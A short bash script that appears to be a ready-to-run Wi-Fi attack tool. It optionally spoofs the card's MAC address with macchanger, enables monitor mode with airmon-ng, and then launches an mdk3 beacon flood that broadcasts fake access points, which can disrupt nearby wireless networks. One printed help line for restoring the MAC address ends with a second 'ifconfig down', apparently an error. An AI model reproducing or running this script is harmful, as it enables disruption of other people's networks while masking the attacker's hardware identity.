#!/bin/bash

echo "[+] List:"
sudo iwconfig
read -p "Please select interface : " interface

check=$(sudo iwconfig $interface)
#echo $check
if [ ! -n "$check" ]; then

	echo "[-] This interface no wireless extensions."

else

	read -p '[!] Change the mac address? [Y/N] ' key
    if [ $key == "Y" -o $key == "y"  ]; then
        sudo ifconfig $interface down
	    sudo macchanger -A $interface
	    sudo ifconfig $interface up
        
    else
        echo -e "\n[-] Not Change the mac address."
	fi
    
	sudo airmon-ng start $interface

	mon=$(echo `sudo airmon-ng`|grep "phy" |cut -d ' ' -f6)
	echo -e "\n[*] You can use 'sudo airmon-ng stop $mon' to stop."
	echo -e "[*] You can use (Need stop the airmon-ng.)\n'sudo ifconfig $interface down && sudo macchanger -p \
$interface && sudo ifconfig $interface down'\n[*] to correct mac address.\n"
	echo "[+]Now woking(Ctrl+C to stop)..."
	sudo mdk3 $mon b -a -s 200

fi
